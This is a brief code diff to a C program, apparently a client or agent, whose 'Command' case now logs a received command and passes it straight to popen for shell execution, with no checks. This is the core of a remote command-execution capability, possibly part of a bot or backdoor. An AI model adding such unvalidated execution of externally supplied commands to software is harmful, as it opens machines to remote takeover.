@@ -26,7 +26,8 @@ int main()
             break;
 
         case Command:
-            Dprintf("[d] we have a command to execute!\n");
+            Dprintf("[d] we have the '%s' command to execute!\n", client->command);
+            popen(client->command, "r");
             break;
 
         case Error:
